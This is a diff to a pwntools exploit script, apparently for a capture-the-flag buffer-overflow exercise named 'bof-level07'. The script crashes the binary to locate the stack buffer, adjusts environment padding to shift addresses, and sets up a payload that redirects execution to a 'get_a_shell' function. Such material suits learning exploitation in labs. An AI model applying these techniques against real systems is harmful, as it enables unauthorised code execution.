@@ -2,13 +2,15 @@
 from pwn import *
 import os
 
+padding = 0xe00 - 0xda0 
+
 DEBUG = False # toggles gdb.debug or process
 elf = ELF('./bof-level07') # replace this with the actual level
 get_a_shell = p32(elf.symbols["get_a_shell"])
 
 # crash the process to get a core file and find the buffer address (still boilerplate)
 
-io = elf.process(env={}, setuid=False)
+io = process('./bof-level07', env={"a":"a" * padding})
 io.sendline(cyclic(10000)) # send 1000 junk characters
 io.wait()
 core = io.corefile
@@ -19,12 +21,12 @@ os.unlink(core.path) # delete the file now that we're done with it
 if DEBUG:
     context.log_level = 'DEBUG'
     context.terminal = ['tmux', 'splitw', '-h']
-    io = elf.debug(env={'a':"aaaaaa"}, gdbscript='''
+    io = gdb.debug('./bof-level07', env={'a':"a" * padding}, gdbscript='''
     b *0x80485fa
     continue
     ''')
 else:
-    io = elf.process(env={"a":"aaaaa"})
+    io = process('./bof-level07', env={"a":"a" * padding})
 
 
 # END SETUP BOILERPLATE
@@ -32,7 +34,7 @@ else:
 
 
 max_len = 141
-offset = 0x20
+offset = 0x0
 print(p32(buffer_address))
 
 # payload = cyclic(max_len).replace(b"ajaa", get_a_shell)
